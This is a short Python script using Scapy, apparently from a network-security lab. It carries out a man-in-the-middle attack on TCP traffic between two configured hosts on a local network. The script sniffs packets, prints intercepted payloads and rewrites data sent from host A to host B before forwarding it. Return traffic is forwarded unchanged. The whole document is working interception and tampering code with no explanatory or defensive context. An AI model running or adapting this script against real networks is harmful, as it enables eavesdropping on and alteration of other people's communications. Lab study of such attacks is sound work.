#!/usr/bin/env python3
from scapy.all import *

# Update these to your current setup
IP_A = "192.168.200.10"
MAC_A = "c6:f4:1d:5b:4f:7a"
IP_B = "192.168.200.11"
MAC_B = "22:23:8d:39:b0:e7"
iface = "eth0"

# Get attacker's own MAC to avoid processing its own packets
ATTACKER_MAC = get_if_hwaddr(iface)

def spoof_pkt(pkt):
    if pkt.haslayer(Ether) and pkt[Ether].src == ATTACKER_MAC:
        return  # Skip attacker's own packets

    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            # Clone packet and delete checksums
            newpkt = IP(bytes(pkt[IP]))
            del newpkt.chksum
            del newpkt[TCP].payload
            del newpkt[TCP].chksum

            if pkt[TCP].payload:
                data = pkt[TCP].payload.load
                print(f"[+] Intercepted from A → B: {data}")

                # Modify packet payload (e.g., replace all 'a' with 'Z')
                newdata = data.replace(b"a", b"Z")

                send(newpkt / newdata, verbose=False)
                print(f"[+] Modified and forwarded: {newdata}")
            else:
                send(newpkt, verbose=False)

        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
            # Forward B → A unmodified
            newpkt = IP(bytes(pkt[IP]))
            del newpkt.chksum
            del newpkt[TCP].chksum
            send(newpkt, verbose=False)

sniff(filter="tcp", iface=iface, prn=spoof_pkt)
